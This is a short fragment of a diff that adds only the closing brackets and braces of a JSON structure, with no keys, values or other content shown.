+        ]
+      }
+    }
+  ]
+}
